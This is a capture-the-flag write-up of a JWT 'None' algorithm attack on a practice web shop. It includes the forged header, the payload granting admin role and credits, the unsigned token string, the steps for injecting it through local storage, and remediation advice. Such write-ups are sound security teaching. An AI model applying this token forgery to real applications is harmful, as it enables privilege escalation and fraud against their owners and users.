# TryHeartMe

**Category:** Web Exploitation  
**Vulnerability:** JWT None Algorithm Attack  
**Difficulty:** Easy

---

## TL;DR

A web shop uses JWT tokens to store user role and credit balance. By exploiting the "None" algorithm vulnerability, we forge a token granting admin role and enough credits to purchase the hidden "Valenflag" item.

---

## Reconnaissance

### Web Application

The app is an online shop. 
![IMG 1](/challenges/screenshots/tryheartme/image.png)

After registering an account, the product page URL and JWT token reveal two key fields: `role` and `credits`. The objective is to purchase a hidden item called "Valenflag" that requires admin access and sufficient credits.

### Identifying the Token

Intercepting a purchase request in Burp Suite reveals a JWT token in the request. 
![IMG 2](/challenges/screenshots/tryheartme/image(2).png)

Pasting it into jwt.io shows the payload:
![IMG 3](/challenges/screenshots/tryheartme/image(3).png)


The algorithm used is `HS256`. The attack surface is clear: if we can forge this token, we control our own role and credit balance.

---

## Exploitation

### Step 1: The None Algorithm Attack

Some JWT libraries accept `"alg": "None"` (or case variations like `none`, `NONE`) as a valid algorithm, treating the token as unsigned. This means any signature is accepted, allowing us to forge arbitrary claims.

Craft a new token with the following header and payload:

**Header:**
```json
{
  "alg": "None",
  "typ": "JWT"
}
```

**Payload:**
```json
{
  "email": "test@test.com",
  "role": "admin",
  "credits": 10000,
  "iat": 1771086929,
  "theme": "valentine"
}
```

Base64url-encode both parts, join with a `.`, and add a trailing `.` with no signature:

```
eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJyb2xlIjoiYWRtaW4iLCJjcmVkaXRzIjoxMDAwMCwiaWF0IjoxNzcxMDg2OTI5LCJ0aGVtZSI6InZhbGVudGluZSJ9.
```

### Step 2: Inject the Token

Replace the existing token in the browser's local storage via DevTools:

```
Application > Local Storage > <site> > token > paste forged token
```
![IMG 4](/challenges/screenshots/tryheartme/image(4).png)



### Step 3: Find and Buy the Hidden Item

Reload the shop page. The hidden "Valenflag" item is now visible. 
![IMG 5](/challenges/screenshots/tryheartme/image(5).png)

Purchase it to retrieve the flag.
![IMG 6](/challenges/screenshots/tryheartme/image(6).png)


---

## Remediation

**1. Explicitly reject the None algorithm server-side**  
The JWT library must be configured to only accept the specific algorithm the application uses (e.g., `HS256`). Any token presenting `alg: none` or an unexpected algorithm should be rejected immediately, regardless of what the token header claims.

```python
# Example using PyJWT
jwt.decode(token, secret, algorithms=["HS256"])  # whitelist only
```

**2. Never trust user-controlled claims without verification**  
Role and credit values should never be read directly from a JWT without verifying the signature first. Sensitive state like this should ideally live server-side (in a database or session), with the JWT serving only as an identifier.

**3. Use a well-maintained JWT library and keep it updated**  
Many older or poorly maintained JWT libraries are vulnerable to algorithm confusion attacks. Use a library that enforces algorithm whitelisting by default.

**4. Validate the full token on every request**  
Signature validation must happen on every authenticated request, not just at login. A forged token should never make it past the first server-side check.

